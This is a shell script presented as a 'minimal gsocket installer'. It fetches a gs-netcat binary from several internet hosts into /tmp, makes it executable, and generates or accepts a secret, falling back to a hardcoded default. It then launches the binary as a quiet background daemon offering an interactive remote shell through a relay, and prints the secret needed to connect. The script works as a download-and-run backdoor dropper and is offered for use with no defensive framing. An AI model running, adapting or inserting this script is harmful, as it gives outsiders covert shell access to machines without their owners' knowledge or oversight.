#!/bin/sh
# Minimal gsocket installer - SH Compatible

echo "[*] GSocket Installer"

# Check for curl/wget
if command -v curl >/dev/null; then
    DL="curl -fsSL"
elif command -v wget >/dev/null; then
    DL="wget -qO-"
else
    echo "[ERROR] Need curl or wget"
    exit 1
fi

# Detect OS/Arch
OS=$(uname -s)
ARCH=$(uname -m)

case "$OS" in
    Linux)
        case "$ARCH" in
            x86_64) BIN="gs-netcat_mini-linux-x86_64" ;;
            i386|i686) BIN="gs-netcat_mini-linux-i686" ;;
            aarch64) BIN="gs-netcat_mini-linux-aarch64" ;;
            armv7l) BIN="gs-netcat_mini-linux-armv7l" ;;
            *) BIN="gs-netcat_mini-linux-x86_64" ;;
        esac
        ;;
    Darwin)
        case "$ARCH" in
            arm64) BIN="gs-netcat_mini-macOS-arm64" ;;
            *) BIN="gs-netcat_mini-macOS-x86_64" ;;
        esac
        ;;
    *)
        BIN="gs-netcat_mini-linux-x86_64"
        echo "[WARN] Unknown OS, using Linux x86_64"
        ;;
esac

echo "[*] Downloading: $BIN"

# Try multiple URLs
URLS="
https://github.com/hackerschoice/binary/raw/main/gsocket/bin/$BIN
https://repo.gsocket.io/$BIN
https://gsocket.io/bin/$BIN
"

for url in $URLS; do
    url=$(echo $url | tr -d '[:space:]')
    [ -z "$url" ] && continue
    
    echo "[*] Trying: $url"
    if $DL "$url" >/tmp/gsocket_tmp 2>/dev/null; then
        if [ -s /tmp/gsocket_tmp ]; then
            mv /tmp/gsocket_tmp /tmp/gsocket
            chmod +x /tmp/gsocket
            break
        fi
    fi
done

if [ ! -x /tmp/gsocket ]; then
    echo "[ERROR] Download failed!"
    exit 1
fi

echo "[OK] Downloaded"

# Test binary
echo "[*] Testing..."
if /tmp/gsocket -g 2>/dev/null; then
    echo "[OK] Binary works"
else
    echo "[WARN] Binary test failed, but continuing"
fi

# Get or generate secret
if [ -n "$X" ]; then
    SECRET="$X"
    echo "[*] Using provided secret"
else
    SECRET=$(/tmp/gsocket -g 2>/dev/null || echo "DefaultSecretChangeMe")
    echo "[*] Generated secret"
fi

# Show info
echo ""
echo "========================================"
echo "INSTALLATION COMPLETE"
echo "========================================"
echo "Secret: $SECRET"
echo "Binary: /tmp/gsocket"
echo ""
echo "To connect:"
echo "gs-netcat -i -s \"$SECRET\""
echo "========================================"

# Start if not in connect mode
if [ -z "$S" ]; then
    echo "[*] Starting..."
    /tmp/gsocket -ilqD &
    echo "[OK] Started"
else
    echo "[*] Connecting..."
    exec /tmp/gsocket -i -s "$S"
fi
